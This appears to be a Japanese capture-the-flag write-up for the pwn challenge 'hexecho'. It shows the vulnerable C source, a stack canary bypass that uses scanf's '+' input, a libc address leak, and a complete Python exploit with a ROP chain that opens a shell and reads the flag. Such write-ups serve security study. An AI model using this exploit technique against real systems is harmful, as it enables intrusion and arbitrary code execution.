# hexecho:Pwn:179pts
Stack canary makes me feel more secure.  

[hexecho.tar.gz](hexecho.tar.gz)  

`nc 34.170.146.252 51786`  

# Solution
ソースと接続先が渡される。  
```bash
$ nc 34.170.146.252 51786
Size: 3
Data (hex): aabbcc
Received: aa bb cc
```
`Size`と`Data (hex)`を受け取り、受け取った値を`Received`としてHexで返している。  
ソースは以下の通りであった。  
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define BUF_SIZE 0x100

int get_size() {
  int size = 0;
  scanf("%d%*c", &size);
  return size;
}

void get_hex(char *buf, unsigned size) {
  for (unsigned i = 0; i < size; i++)
    scanf("%02hhx", buf + i);
}

void hexecho() {
  int size;
  char buf[BUF_SIZE];

  // Input size
  printf("Size: ");
  size = get_size();

  // Input data
  printf("Data (hex): ");
  get_hex(buf, size);

  // Show data
  printf("Received: ");
  for (int i = 0; i < size; i++)
    printf("%02hhx ", (unsigned char)buf[i]);
  putchar('\n');
}

int main() {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  hexecho();
  return 0;
}
```
`Size`の制限が無いため、BOFし放題である。  
セキュリティ機構をチェックする。  
```bash
$ checksec --file=./hexecho
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   43 Symbols      N/A     0               0               ./hexecho
```
canaryがあるためリークを考えるが、読み取れそうな場所はない。  
ここで`scanf`に`+`を渡した際に、その個所のバッファには何も書き込まれず元の値が保持されるという挙動を思い出す。  
これでcanaryをスキップし、それ以降のリターンアドレスのみ書き換えてROPしてやればよさそうだ。  
さらに、`Size`を使い果たすより前にHexでない文字で入力を終了すると、それ以降のバッファが流れ出ることもわかる。  
```bash
$ ./hexecho
Size: 20
Data (hex): aabbccs
Received: aa bb cc 00 00 00 00 00 0c 00 00 00 00 00 00 00 40 00 00 00
```
これでスタック上にあるlibcのアドレスもリークできそうだ。  
うまくオフセットを調整し、`main`にもう一度飛ばすことで`__libc_start_main+128`からリークしたアドレスでROPする(アライメントに注意)。  
以下のexploit.pyで行う。  
```python
from ptrlib import *

elf = ELF("./hexecho")

# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("./libc.so.6")

# sock = Process("./hexecho")
sock = Socket("nc 34.170.146.252 51786")
# sock.debug = True


def hexecho(n):
    hexstr = hex(n)[2:].zfill(16)
    return "".join([hexstr[i : i + 2] for i in range(0, len(hexstr), 2)][::-1]).encode()


payload = b"A" * 0x210
payload += b"+" * 0x9
payload += b"B" * 0xF
payload += hexecho(next(elf.gadget("ret;")))
payload += hexecho(elf.symbol("main"))
payload += b"s"
sock.sendlineafter("Size: ", 0x1000)
sock.sendlineafter("Data (hex): ", payload)

leak = int("".join((sock.recvline()[0x562:0x573]).decode().split()[::-1]), 16)
logger.info("__libc_start_main+128 = " + hex(leak))
libc.base = leak - libc.symbol("__libc_start_main") - 0x80

payload = b"A" * 0x210
payload += b"+" * 0x9
payload += b"B" * 0xF
payload += hexecho(next(libc.gadget("pop rdi; ret;")))
payload += hexecho(next(libc.search("/bin/sh")))
payload += hexecho(next(libc.gadget("ret;")))
payload += hexecho(libc.symbol("system"))
payload += b"s"
sock.sendlineafter("Size: ", 0x1000)
sock.sendlineafter("Data (hex): ", payload)
sock.recvline()

sock.sh()
```
実行する。  
```bash
$ python exploit.py
[+] __init__: Successfully connected to 34.170.146.252:51786
[+] <module>: __libc_start_main+128 = 0x7f5d61c3ce40
[+] base: New base address: 0x7f5d61c13000
[ptrlib]$ ls
run
[ptrlib]$ ls /
app
bin
boot
dev
etc
flag.txt
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
[ptrlib]$ cat /flag.txt
Alpaca{4Lw4y5_cH3cK_1f_a_fuNc71on_f4iL3d}
```
flagが得られた。  

## Alpaca{4Lw4y5_cH3cK_1f_a_fuNc71on_f4iL3d}